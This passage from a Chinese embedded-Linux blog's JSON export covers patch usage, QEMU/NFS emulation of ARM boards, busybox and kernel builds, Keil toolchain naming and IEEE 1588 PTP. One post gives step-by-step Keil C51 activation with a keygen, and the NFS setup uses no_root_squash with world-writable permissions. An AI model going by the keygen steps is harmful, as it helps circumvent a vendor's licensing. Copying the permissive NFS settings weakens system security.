此时test0就和test1一样了。 如果要取消补丁做出的更改，恢复旧版本： $ patch -RE -p0 &lt; test1.patch patching file test0 文件夹补丁 设有如下环境： –prj0/ test0 prj0name –prj1/ test1 prj1name prj0/prj0name内容为如下三行： prj0/prj0name prj1/prj1name内容为如下三行： prj1/prj1name 用 diff -uNr 创建补丁， diff -uNr prj0 prj1 &gt; prj1.patch 得到的patch文件为： diff -uNr prj0/prj0name prj1/prj0name — prj0/prj0name 2006-08-18 09:25:11.000000000 +0800 +++ prj1/prj0name 1970-01-01 08:00:00.000000000 +0800 @@ -1,3 +0,0 @@ -prj0/prj0name diff -uNr prj0/prj1name prj1/prj1name — prj0/prj1name 1970-01-01 08:00:00.000000000 +0800 +++ prj1/prj1name 2006-08-18 09:26:36.000000000 +0800 @@ -0,0 +1,3 @@ +——— +prj1/prj1name +——— diff -uNr prj0/test0 prj1/test0 — prj0/test0 2006-08-18 09:23:53.000000000 +0800 +++ prj1/test0 1970-01-01 08:00:00.000000000 +0800 @@ -1,3 +0,0 @@ -111111 -111111 -111111 diff -uNr prj0/test1 prj1/test1 — prj0/test1 1970-01-01 08:00:00.000000000 +0800 +++ prj1/test1 2006-08-18 09:26:00.000000000 +0800 @@ -0,0 +1,4 @@ +222222 +111111 +222222 +111111 如果要应用此补丁，则： $ ls prj0 prj1 prj1.patch $ cd prj0 $ patch -p1 &lt; ../prj1.patch patching file prj0name patching file prj1name patching file test0 patching file test1 此时可用ls看到打补丁后的结果： $ ls prj1name test1 类似的，如果要回滚补丁操作： $ patch -R -p1 &lt; ../prj1.patch patching file prj0name patching file prj1name patching file test0 patching file test1 $ ls prj0name test0 参考资料 1. [↑](http://linux-wiki.cn/wiki/zh-hans/%E8%A1%A5%E4%B8%81(patch)%E7%9A%84%E5%88%B6%E4%BD%9C%E4%B8%8E%E5%BA%94%E7%94%A8#cite_ref-0)[Linux下patch的制作和应用](http://www.cublog.cn/u/21948/showart_157145.html)","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"gentoo+qemu+nfs模拟arm环境","slug":"EMBEDDED/gentoo+qemu+nfs模拟arm环境","date":"2016-05-18T00:41:38.000Z","updated":"2017-07-10T08:49:19.343Z","comments":true,"path":"EMBEDDED/gentoo+qemu+nfs模拟arm环境.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/gentoo+qemu+nfs模拟arm环境.html","excerpt":"想完全模拟公司交换机的环境还真不容易。 下面给出在gentoo上利用qemu 实现nfs挂载busybox 我尽量给出版本信息，因为不同版本直接是否能成功! ARM linux qemu仿真运行环境 (NFS启动) 注:我的gentoo内核","text":"想完全模拟公司交换机的环境还真不容易。 下面给出在gentoo上利用qemu 实现nfs挂载busybox 我尽量给出版本信息，因为不同版本直接是否能成功! ARM linux qemu仿真运行环境 (NFS启动) 注:我的gentoo内核是通过genkernel all全配置的， 如果您是自己定制还需看官方手册增加相应的内核配置 1)Host中安装nfs #emerge net-fs/nfs-utils -av [ebuild R ] net-fs/nfs-utils-1.3.1-r5::gentoo USE=”ipv6 libmount nfsidmap nfsv4 tcpd uuid -caps -kerberos -nfsdcld -nfsv41 (-selinux)” 这个版本nfs默认协议是version 3 所以下面启动qemu是注意添加版本信息 2)配置nfs # mkdir -p /srv/nfs/ 编辑/etc/exports文件，增加如下内容: /srv/nfs 192.168.42.0/24(rw,sync,no_root_squash,no_subtree_check) 3)把制作的rootfs文件系统的目录拷贝的nfs目录下（以普通用户qinyu身份执行） # cp -rf ~/mkrtfs/rootfs /srv/nfs/ #sudo chmod 777 /srv/nfs -R # sudo chown -R qinyu:qinyu /srv/nfs 如果root身份执行，请修改nfs root目录权限 我就是用的root 省得麻烦 4)启动nfs-server #sudo exportfs -av #sudo systemctl start rpcbind.service #sudo systemctl start nfs-server.service 测试nfs export是否成功（以root身份执行） # mkdir ~/nfs_test # mount localhost:/srv/nfs ~/nfs_ # umount ~/nfs_test 5)给qemu添加网卡 sudo emerge sys-apps/usermode-utilities -av sudo tunctl -u $USER -t tap0 sudo ifconfig tap0 192.168.42.1 6）启动测试 添加qemu-ifup文件，内容为： #!/bin/sh echo “Executing /etc/qemu-ifup” sudo ifconfig tap0 192.168.42.1 我的测试命令： sudo qemu-system-arm -M versatilepb -m 128M -kernel /home/demonelf/vrrp/madwork/linux-2.6.31.8/arch/arm/boot/zImage -append “root=/dev/nfs nfsroot=192.168.42.1:/home/demonelf/vrrp/madwork/busybox-1.20.0/_install,nfsvers=3 rw ip=192.168.42.250::192.168.42.1:255.255.255.0::eth0:off init=/sbin/init console=ttyAMA0” -net nic,vlan=0 -net tap,vlan=0,ifname=tap0,script=./qemu-ifup,downscript=no -nographic #qemu-system-arm -version QEMU emulator version 2.5.1, Copyright (c) 2003-2008 Fabrice Bellard 如果启动出现 Warning: unable to open an initial console. 在dev下执行 mknod -m 622 console c 5 1 mknod -m 622 tty0 c 4 0","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Keil C51 v9.55下载及激活","slug":"EMBEDDED/Keil C51 v9.55下载及激活","date":"2016-05-17T00:06:34.000Z","updated":"2017-07-10T08:50:34.300Z","comments":true,"path":"EMBEDDED/Keil C51 v9.55下载及激活.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/Keil C51 v9.55下载及激活.html","excerpt":"Keil C51 Keil C51是美国Keil Software公司出品的51系列兼容单片机C语言软件开发系统，与汇编相比，C语言在功能上、结构性、可读性、可维护性上有明显的优势，因而易学易用。Keil提供了包括C编译器、宏汇编、链接器、库管理和","text":"Keil C51 Keil C51是美国Keil Software公司出品的51系列兼容单片机C语言软件开发系统，与汇编相比，C语言在功能上、结构性、可读性、可维护性上有明显的优势，因而易学易用。Keil提供了包括C编译器、宏汇编、链接器、库管理和一个功能强大的仿真调试器等在内的完整开发方案，通过一个集成开发环境（μVision）将这些部分组合在一起。运行Keil软件需要WIN98、NT、WIN2000、WINXP等操作系统。如果你使用C语言编程，那么Keil几乎就是你的不二之选，即使不使用C语言而仅用汇编语言编程，其方便易用的集成环境、强大的软件仿真调试工具也会令你事半功倍。 官方下载 Keil C51 v9.55下载 MD5:132a24986774bb607af12fa8e58f1bfd 注册机 注册机下载（访问密码：6fd7） 激活 以管理员身份运行软件，选择File–&gt;License Management，复制其中CID号。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 打开注册机，把刚才复制的CID号粘贴到CID框中，其它项保持默认，点击 Generate，生成一个序列号，复制序列号。&lt;/span&gt;&lt;/span&gt; 把序列号粘贴到下面的框中，点击 Add LIC.软件注册使用期到2020 年。 &lt;/span&gt; 添加STC单片机数据库 打开STC-ISP依次点击Keil仿真设置-&gt;添加型号和头文件到Keil中，选择Keil的安装目录后点确定就添加成功了。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Keil、uVision、RealView、MDK、Keil C51之间的区别比较","slug":"EMBEDDED/Keil、uVision、RealView、MDK、Keil C51之间的区别比较","date":"2016-05-16T23:57:17.000Z","updated":"2017-07-10T08:50:37.654Z","comments":true,"path":"EMBEDDED/Keil、uVision、RealView、MDK、Keil C51之间的区别比较.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/Keil、uVision、RealView、MDK、Keil C51之间的区别比较.html","excerpt":"我们要区别的概念：KEIL uVision，KEIL MDK，KEIL For ARM，RealView MDK，KEIL C51，KEIL C166，KEIL C251 从接触MCS-51单片机开始，我们就知道有一个叫KEIL的软件。在开发单片机时，","text":"我们要区别的概念：KEIL uVision，KEIL MDK，KEIL For ARM，RealView MDK，KEIL C51，KEIL C166，KEIL C251 从接触MCS-51单片机开始，我们就知道有一个叫KEIL的软件。在开发单片机时，使用的是C语言或者汇编语言，我们知道，这两种语言都不能直接烧写到单片机里面，执不执行暂且不说，光是代码的体积，就足以撑破整个单片机。 所以，我们需要一个软件，把C语言或者汇编语言编译生成单片机可执行的二进制代码，而且它的体积也非常的小，足够存放在单片机的存储器里面。KEIL公司（现在是ARM公司的一个公司）的软件恰好可以提供这样的功能，并且它还有很多优点，比如工程易于管理，自动加载启动代码，集编辑、编译、仿真一体，调试功能强大等等。因此，不管是初学单片机的爱好者，还是经验丰富的工程师，都非常喜欢使用这些软件。 但是，即使熟练使用了KEIL软件，有些概念我们还是不容易理清，常常混淆。KEIL、uVision、RealView、MDK、KEIL C51，它们到底有什么区别，又有什么联系？下面我们就做一个详细的分析。 KEIL是公司的名称，有时候也指KEIL公司的所有软件开发工具，目前2005年Keil由ARM公司收购，成为ARM的公司之一。 uVision是KEIL公司开发的一个集成开发环境（IDE），和Eclipse类似。它包括工程管理，源代码编辑，编译设uVision置，下载调试和模拟仿真等功能，uVision有uVision2、uVision3、uVision4、uVision5四个版本，目前最新的版本是uVision5。它提供一个环境，让开发者易于操作，并不提供能具体的编译和下载功能，需要软件开发者添加。uVisionu通用于KEIL的开发工具中，例如MDK，PK51，PK166，DK251等。 RealView是一系列开发工具集合的称呼，简称RV，包括有RVD（RealView Debugger），RVI（RealView ICE），RVT（RealView Trace），RVDS（RealView Development Suite），RV MDK（RealView Microcontroller Development Kit）这些产品。这些都是为了让客户容易记住，采取的一个宣传策略。 举个例子说，米尔科技是一家主营优质ARM工控板的企业，其产品系列由工控板（开发板）、单板机和核心板组成，虽然本来可以都叫工控板，但是为了让客户清晰了解产品的功能，进行选型，所以就分为3个系列。不过2009年ARM又宣布停止使用Realview品牌，所以目前ARM就剩下了ARM和KEIL两个品牌了。 MDK（Microcontroller Development Kit），也称MDK-ARM、KEIL MDK、RealView MDK、KEIL For ARM，都是同一个东西。ARM公司现在统一使用MDK-ARM的称呼，MDK的设备数据库中有很多厂商的芯片，是专为微控制器开发的工具，为满足基于MCU进行嵌入式软件开发的工程师需求而设计，支持ARM7，ARM9，Cortex-M4/M3/M1，Cortex-R0/R3/R4等ARM微控制器内核。 KEIL C51，亦即PK51，KEIL公司开发的基于uVision IDE，支持绝大部分8051内核的微控制器开发工具。 KEIL C166，亦即PK166，KEIL公司开发的基于uVision IDE，支持绝大部分XC16x，C16x和ST10系列的微控制器开发工具。 KEIL C251，亦即DK251，是KEIL公司开发的基于uVision IDE，支持绝大部分基于251核的微控制器的开发工具。 总结来说，KEIL公司目前有四款独立的嵌入式软件开发工具，即MDK、KEIL C51、KEIL C166、KEIL C251，它们都是KEIL公司品牌下的产品，都基于uVision集成开发环境，其中MDK是RealView系列中的一员。 Keil MDK-ARM开发工具介绍 Keil MDK-ARM uVision5最新下载 new! Keil C51开发工具介绍 Keil C51最新下载 new! 本文来自米尔科技，原文地址： http://www.myir-tech.com/resource/512.asp，转载请注明出处。 &lt;/span&gt;&lt;/span&gt;","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"make Image uImage与zImage的区别","slug":"EMBEDDED/make Image uImage与zImage的区别","date":"2016-05-16T09:13:38.000Z","updated":"2017-07-10T08:50:49.926Z","comments":true,"path":"EMBEDDED/make Image uImage与zImage的区别.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/make Image uImage与zImage的区别.html","excerpt":"内核编译（make）之后会生成两个文件，一个Image，一个zImage，其中Image为内核映像文件，而zImage为内核的一种映像压缩文件，Image大约为4M，而zImage不到2M。 那么uImage又是什么的？它是uboot专用的映像文件","text":"内核编译（make）之后会生成两个文件，一个Image，一个zImage，其中Image为内核映像文件，而zImage为内核的一种映像压缩文件，Image大约为4M，而zImage不到2M。 那么uImage又是什么的？它是uboot专用的映像文件，它是在zImage之前加上一个长度为64字节的“头“，说明这个内核的版本、加载位置、生成时间、大小等信息；其0x40之后与zImage没区别。 如 何生成uImage文件？首先在uboot的/tools目录下寻找mkimage文件，把其copy到系统/usr/local/bin目录下，这样就 完成制作工具。然后在内核目录下运行make uImage，如果成功，便可以在arch/arm/boot/目录下发现uImage文件，其大小比 zImage多64个字节。 其实就是一个自动跟手动的区别,有了uImage头部的描述,u-boot就知道对应Image的信息,如果没有头部则需要自己手动去搞那些参数。 U-boot的U是“通用“的意思。 zImage 是ARM Linux常用的一种压缩映像文件，uImage是U-boot专用的映像文件，它是在zImage之前加上一个长度为0x40的“头“，说明 这个映像文件的类型、加载位置、生成时间、大小等信息。换句话说，如果直接从uImage的0x40位置开始执行，zImage和uImage没有任何区 别。另外，Linux2.4内核不支持uImage，Linux2.6内核加入了很多对嵌入式系统的支持，但是uImage的生成也需要设置。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"qemu模拟versatilepb-armv5开发板","slug":"EMBEDDED/qemu模拟versatilepb-armv5开发板","date":"2016-05-16T04:05:36.000Z","updated":"2017-07-10T08:51:16.931Z","comments":true,"path":"EMBEDDED/qemu模拟versatilepb-armv5开发板.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/qemu模拟versatilepb-armv5开发板.html","excerpt":"想要模拟的环境： Linux version 2.6.31.8 (hanzhen@bogon) (gcc version 4.3.2 (sdk3.2rc1-ct-ng-1.4.1) ) #13 Wed Aug 5 16:04:02 CST 2015","text":"想要模拟的环境： Linux version 2.6.31.8 (hanzhen@bogon) (gcc version 4.3.2 (sdk3.2rc1-ct-ng-1.4.1) ) #13 Wed Aug 5 16:04:02 CST 2015 CPU: Feroceon 88FR131 [56251311] revision 1 (ARMv5TE), cr=000539f7 CPU: VIVT data cache, VIVT instruction cache Machine: Feroceon-KW Marvell Development Board (LSP Version KW_LSP_5.4.0_012)– DB-98DX4122-48G Soc: MV88F6281 Rev 3 BE 编译选项可参考kirkwood_defconfig (Feroceon 88FR131) 以上是公司用到的的环境，qemu没有这个开发板， 下面用versatilepb替代。 安装QEMU #qemu-system-arm -version QEMU emulator version 2.5.1, Copyright (c) 2003-2008 Fabrice Bellard 2) 虚拟开发板选择 http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0225d/index.html 有两个板子 ： a) Versatile Application Baseboard for ARM926EJ-S b) Versatile Platform Baseboard for ARM926EJ-S 3）编译内核 #tar xvf linux-2.6.34.14.tar.xz #cd linux-2.6.34.14 #make CROSS_COMPILE=armeb-mv5sft-linux-gnueabi- ARCH=arm versatile_defconfig #make CROSS_COMPILE=armeb-mv5sft-linux-gnueabi- ARCH=arm menuconfig 进入图形配置界面将Kernel Featurer中的Use the ARM EABI to compile the kernel选上 # make CROSS_COMPILE=armeb-mv5sft-linux-gnueabi- ARCH=arm all 在arch/arm/boot/下会生成zImage文件，该文件就是后期制作kernel的bin文件用的kernel镜像文件。 测试： qemu-system-arm -M versatilepb -kernel arch/arm/boot/zImage -append “console=ttyAMA0” -nographic 4）编译busybox #wget http://www.busybox.net/downloads/busybox-1.20.0.tar.bz2 #tar -xvf xxxxx.tar.gz #tar xvf busybox-1.20.0.tar.bz2 #cd busybox-1.20.0 #make ARCH=arm CROSS_COMPILE=armeb-mv5sft-linux-gnueabi- defconfig 将init/init.c 694 new_init_action(ASKFIRST,bb_default_login_shell,VC_2); 695 new_init_action(ASKFIRST,bb_default_login_shell,VC_3); 696 new_init_action(ASKFIRST,bb_default_login_shell,VC_4); 这三行注释掉 #make menuconfig 进入图形配置界面 将 Busybox Settings –&gt; Build Options –&gt; Build Busybox as a static binary勾上 Networking Utilities -&gt; inetd去掉 busybox setting－&gt;build options-&gt; cross compile prefix中写入arm-linux- # make ARCH=arm CROSS_COMPILE=arm-linux- install 完成后，在本目录会生成_install目录。 #cd _install #mkdir proc sys dev etc etc/init.d #vim etc/init.d/rcS 添加内容 #!/bin/sh mount -t proc none /proc mount -t sysfs none /sys /sbin/mdev -s 修改权限 #chmod 777 etc/init.d/rcS #find . |cpio -o –format=newc &gt; ../rootfs.img #cd .. #gzip -c rootfs.img &gt; rootfs.img.gz 测试： qemu-system-arm -M versatilepb -kernel /home/demonelf/vrrp/madwork/linux-2.6.31.8/arch/arm/boot/zImage -initrd rootfs.img -append “root=/dev/ram rdinit=/sbin/init console=ttyAMA0” -nographic 5）编译uboot make CROSS_COMPILE=arm-linux- ARCH=arm versatilepb_config make CROSS_COMPILE=arm-linux- ARCH=arm all .globl raise raise: nop mov pc, lr 6）启动qemu qemu-system-arm -M versatilepb -cpu arm926 -m 256M -kernel /home/demonelf/vrrp/madwork/linux-2.6.31.8/arch/arm/boot/zImage -nographic -append “console=ttyAMA0” qemu-system-arm -M versatilepb -kernel /home/demonelf/vrrp/madwork/linux-2.6.31.8/arch/arm/boot/zImage -initrd rootfs.img.gz -append “root=/dev/ram rdinit=/sbin/init” 参考资料： Debian on an emulated ARM machine https://www.aurel32.net/info/debian_arm_qemu.php 从零使用qemu模拟器搭建arm运行环境 http://blog.csdn.net/linyt/article/details/42504975 在 Gentoo Linux 下使用 crossdev 建立自己的 toolchain http://coldnew.github.io/blog/2015/05-18_f69644/ 用Qemu模拟vexpress-a9 （一） — 搭建Linux kernel调试环境 http://www.cnblogs.com/pengdonglin137/p/5023342.html qemu 模拟-arm-mini2440开发板-启动u-boot，kernel和nfs文件系统 http://blog.csdn.net/zeroboundary/article/details/12657215 qemu下u-boot+kernel+rootfs完整启动移植手册 http://wenku.baidu.com/view/c343f68bb9d528ea81c77912.html","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"qemu下u-boot+kernel+rootfs完整启动移植手册","slug":"EMBEDDED/qemu下u-boot+kernel+rootfs完整启动移植手册","date":"2016-05-13T12:36:38.000Z","updated":"2017-07-10T02:01:05.144Z","comments":true,"path":"EMBEDDED/qemu下u-boot+kernel+rootfs完整启动移植手册.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/qemu下u-boot+kernel+rootfs完整启动移植手册.html","excerpt":"","text":"","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"chroot到arm交换机的文件系统上","slug":"EMBEDDED/chroot到arm交换机的文件系统上","date":"2016-05-12T10:42:30.000Z","updated":"2017-07-10T08:45:46.667Z","comments":true,"path":"EMBEDDED/chroot到arm交换机的文件系统上.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/chroot到arm交换机的文件系统上.html","excerpt":"哈 真实板子上： 不过发现chroot的方式缺点还是很大的，例如内核，网卡等环境都是真实机子上的。 郁闷啊一下子给这2.6内核的文件系统 上个4.1的内核，还真是各种不兼容。","text":"哈 真实板子上： 不过发现chroot的方式缺点还是很大的，例如内核，网卡等环境都是真实机子上的。 郁闷啊一下子给这2.6内核的文件系统 上个4.1的内核，还真是各种不兼容。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"IEEE1588精密网络同步协议（PTP）-v2.0协议浅析","slug":"EMBEDDED/IEEE1588精密网络同步协议（PTP）-v2.0协议浅析","date":"2016-05-11T04:50:33.000Z","updated":"2017-07-10T08:50:10.651Z","comments":true,"path":"EMBEDDED/IEEE1588精密网络同步协议（PTP）-v2.0协议浅析.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/IEEE1588精密网络同步协议（PTP）-v2.0协议浅析.html","excerpt":"1 引言 以太网技术由于其开放性好、价格低廉和使用方便等特点，已经广泛应用于电信级别的网络中，以太网的数据传输速度也从早期的10M提高到100M，GE，10GE。40GE，100GE正式产品也于2009年推出。 以太网技术是”即插即用”的，也就是将以","text":"1 引言 以太网技术由于其开放性好、价格低廉和使用方便等特点，已经广泛应用于电信级别的网络中，以太网的数据传输速度也从早期的10M提高到100M，GE，10GE。40GE，100GE正式产品也于2009年推出。 以太网技术是”即插即用”的，也就是将以太网终端接到IP网络上就可以随时使用其提供的业务。但是，只有”同步的”的IP网络才是一个真正的电信级网络，才能够为IP网络传送各种实时业务与数据业务的多重播放业务提供保障。目前，电信级网络对时间同步要求十分严格，对于一个全国范围的IP网络来说，骨干网络时延一般要求控制在50ms之内，现行的互联网网络时间协议NTP（Network Time Protocol），简单网络时间协议SNTP（Simple Network Time Protocol）等不能达到所要求的同步精度或收敛速度。基于以太网的时分复用通道仿真技术（TDM over Ethernet）作为一种过渡技术，具有一定的以太网时钟同步概念，可以部分解决现有终端设备用于以太网的无缝连接问题。IEEE 1588标准则特别适合于以太网，可以在一个地域分散的IP网络中实现微秒级高精度的时钟同步。本文重点介绍IEEE 1588技术及其测试实现。 2 IEEE 1588PTP介绍 IEEE 1588PTP协议借鉴了NTP技术，具有容易配置、快速收敛以及对网络带宽和资源消耗少等特点。IEEE1588标准的全称是”网络测量和控制系统的精密时钟同步协议标准（IEEE 1588 Precision Clock Synchronization Protocol）”，简称PTP（Precision Timing Protocol），它的主要原理是通过一个同步信号周期性的对网络中所有节点的时钟进行校正同步，可以使基于以太网的分布式系统达到精确同步，IEEE 1588PTP时钟同步技术也可以应用于任何组播网络中。 IEEE 1588将整个网络内的时钟分为两种，即普通时钟（Ordinary Clock，OC）和边界时钟（Boundary Clock，BC），只有一个PTP通信端口的时钟是普通时钟，有一个以上PTP通信端口的时钟是边界时钟，每个PTP端口提供独立的PTP通信。其中，边界时钟通常用在确定性较差的网络设备（如交换机和路由器）上。从通信关系上又可把时钟分为主时钟和从时钟，理论上任何时钟都能实现主时钟和从时钟的功能，但一个PTP通信子网内只能有一个主时钟。整个系统中的最优时钟为最高级时钟GMC（Grandmaster Clock），有着最好的稳定性、精确性、确定性等。根据各节点上时钟的精度和级别以及UTC（通用协调时间）的可追溯性等特性，由最佳主时钟算法（Best Master Clock）来自动选择各子网内的主时钟；在只有一个子网的系统中，主时钟就是最高级时钟GMC。每个系统只有一个GMC，且每个子网内只有一个主时钟，从时钟与主时钟保持同步。图1所示的是一个典型的主时钟、从时钟关系示意。 图1 主时钟、从时钟关系示意图 同步的基本原理包括时间发出和接收时间信息的记录，并且对每一条信息增加一个”时间戳”。有了时间记录，接收端就可以计算出自己在网络中的时钟误差和延时。为了管理这些信息，PTP协议定义了4种多点传送的报文类型和管理报文，包括同步报文（Sync），跟随报文（Follow_up），延迟请求报文（Delay_Req），延迟应答报文（Delay_Resp）。这些报文的交互顺序如图2所示。收到的信息回应是与时钟当前的状态有关的。同步报文是从主时钟周期性发出的(一般为每两秒一次)，它包含了主时钟算法所需的时钟属性。总的来说同步报文包含了一个时间戳，精确地描述了数据包发出的预计时间。 图2 PTP报文与交换顺序 由于同步报文包含的是预计的发出时间而不是真实的发出时间，所以Sync报文的真实发出时间被测量后在随后的Follow_Up报文中发出。Sync报文的接收方记录下真实的接收时间。使用Follow_Up报文中的真实发出时间和接收方的真实接收时间，可以计算出从属时钟与主时钟之间的时差，并据此更正从属时钟的时间。但是此时计算出的时差包含了网络传输造成的延时，所以使用Delay_Req报文来定义网络的传输延时。 Delay_Req报文在Sync报文收到后由从属时钟发出。与Sync报文一样，发送方记录准确的发送时间，接收方记录准确的接收时间。准确的接收时间包含在Delay_Resp报文中，从而计算出网络延时和时钟误差。同步的精确度与时间戳和时间信息紧密相关。纯软件的方案可以达到毫秒的精度，软硬件结合的方案可以达到微秒的精度。PTP协议基于同步数据包被传播和接收时的最精确的匹配时间，每个从时钟通过与主时钟交换同步报文而与主时钟达到同步。这个同步过程分为漂移测量阶段和偏移测量与延迟测量阶段。 第一阶段修正主时钟与从时钟之间的时间偏差，称为漂移测量。如图3所示，在修正漂移量的过程中，主时钟按照定义的间隔时间（缺省是2s）周期性地向相应的从时钟发出惟一的同步报文。这个同步报文包括该报文离开主时钟的时间估计值。主时钟测量传递的准确时间T0 K，从时钟测量接收的准确时间T1 K。之后主时钟发出第二条报文——跟随报文（Follow_up Message），此报文与同步报文相关联，且包含同步报文放到PTP通信路径上的更为精确的估计值。这样，对传递和接收的测量与标准时间戳的传播可以分离开来。从时钟根据同步报文和跟随报文中的信息来计算偏移量，然后按照这个偏移量来修正从时钟的时间，如果在传输路径中没有延迟，那么两个时钟就会同步。 图3 PTP时钟漂移测量计算 为了提高修正精度，可以把主时钟到从时钟的报文传输延迟等待时间考虑进来，即延迟测量，这是同步过程的第二个阶段（见图4）。 图4 PTP时钟延迟和偏移计算 从时钟向主时钟发出一个”延迟请求”数据报文，在这个过程中决定该报文传递准确时间T2。主时钟对接收数据包打上一个时间戳，然后在”延迟响应”数据包中把接收时间戳B送回到从时钟。根据传递时间戳B和主时钟提供的接收时间戳D，从时钟计算与主时钟之间的延迟时间。与偏移测量不同，延迟测量是不规则进行的，其测量间隔时间（缺省值是4~60s之间的随机值）比偏移值测量间隔时间要大。这样使得网络尤其是设备终端的负荷不会太大。采用这种同步过程，可以消减PTP协议栈中的时间波动和主从时钟间的等待时间。从图4右边可以看到延迟时间D 和偏移时间数值O的计算方法。 IEEE 1588目前的版本是v2.2，主要应用于相对本地化、网络化的系统，内部组件相对稳定，其优点是标准非常具有代表性，并且是开放式的。由于它的开放性，特别适合于以太网的网络环境。与其他常用于Ethernet TCP/IP网络的同步协议如SNTP或NTP相比，主要区别是PTP是针对更稳定和更安全的网络环境设计的，所以更为简单，占用的网络和计算资源也更少。NTP协议是针对于广泛分散在互联网上的各个独立系统的时间同步协议。GPS(基于卫星的全球定位系统)也是针对于分散广泛且各自独立的系统。PTP定义的网络结构可以使自身达到很高的精度，与SNTP和NTP相反，时间戳更容易在硬件上实现，并且不局限于应用层，这使得PTP可以达到微秒以内的精度。此外，PTP模块化的设计也使它很容易适应低端设备。 IEEE1588标准所定义的精确网络同步协议实现了网络中的高度同步，使得在分配控制工作时无需再进行专门的同步通信，从而达到了通信时间模式与应用程序执行时间模式分开的效果。 由于高精度的同步工作，使以太网技术所固有的数据传输时间波动降低到可以接受的，不影响控制精度的范围。 3 IXIA IEEE 1588PTP测试方案 美国IXIA公司目前提供最为完整的城域以太网功能、性能、一致性测试解决方案，并且最先在2~7层统一IP测试平台实现了IEEE 1588PTP时钟同步技术方案。关于IXIA 的城域以太网测试解决方案在以前有过详细介绍，在这里对相应的技术点和对应IXIA应用程序做一总结（见表1）。 表1 IXIA城域以太网测试方案及对应程序 图5是典型的IEEE 1588PTP测试场景，IXIA测试端口可以仿真普通时钟并处于主模式，被测设备，比如以太网交换机处于边界时钟状态，验证其对各种时钟报文的处理能力与实现；另一种测试情况是IXIA端口仿真边界时钟并处于从属模式，这时候被测设备处于主模式，验证被测设备在主时钟模式下的处理机制。IXIA端口都有PTP协议栈，可以对PTP时钟信息做灵活的配置。 图5 IEEE 1588典型测试场景 IXIA IEEE 1588PTP测试方案所支持的特性包括：支持目前最为流行的IEEE 1588 2.2版本；支持两步时钟配置；一个物理端口可以同时产生PTP流量和非PTP流量；一个物理端口一个时钟信号设置，时钟可以手动设置为主模式或者从模式；可以以柱状图显示从时钟对应于主时钟的偏移量；IXIA IxExplorer内置的实时协议分析解码软件可以对PTP报文直接进行编辑或者解码。在测试过程中可以实时显示各种详细的PTP统计信息，统计信息见表2。 表2 IXIA IEEE 1588PTP测试统计信息 IXIA IEEE 1588PTP方案还可以实现负面测试（Negative Testing），可以根据需要设定发送Sync报文中Follow-up报文的比例，观察丢弃掉的Follow-up报文对被测设备的影响；在Follow-up报文中增加错误数据包，验证被测设备的处理与检测能力；发送包括抖动与偏移的带有时间戳的数据包迫使Sync报文失败，检验被测设备的处理机制。图6所示为PTP时钟配制界面。 图6 PTP时钟配置界面 4 结束语 根据最新的信息公告，IXIA 被eWeek授予年度十大产品奖之一，被Frost &amp; Sullivan授予2008全球三重播放综合测试和监测设备的年度市场领先奖，被Test &amp; Measurement World授予三个最佳测试奖，以及被Internet Telephony授予年度产品奖，被如此众多令人尊敬有技术影响力组织机构的认可，进一步证明了IXIA正在推动测试、测量和业务认证市场的进步和战略创新，在城域以太网网技术方面，IXIA同样保持领先的地位，推出了业界第一个100G高速以太网测试加速系统，第一个在统一2~7层IP测试平台上推出了IEEE 1588PTP 精密时钟同步协议测试技术，IXIA这些技术创新和技术的领导地位，都为全面的IP测试提供了可靠保证。 转自：http://www.21ic.com/app/test/200903/34492.htm","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"GCC中同时使用动态和静态库链接的编译","slug":"EMBEDDED/GCC中同时使用动态和静态库链接的编译","date":"2016-05-11T02:56:50.000Z","updated":"2017-07-10T08:49:04.499Z","comments":true,"path":"EMBEDDED/GCC中同时使用动态和静态库链接的编译.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/GCC中同时使用动态和静态库链接的编译.html","excerpt":"如何同时同时使用动态和静态库链接，在GCC指令参数中具体参数如下： －Wl,-Bstatic -L/usr/local/sqlite-arm-linux/.libs -lsqlite -Wl,-Bdynamic 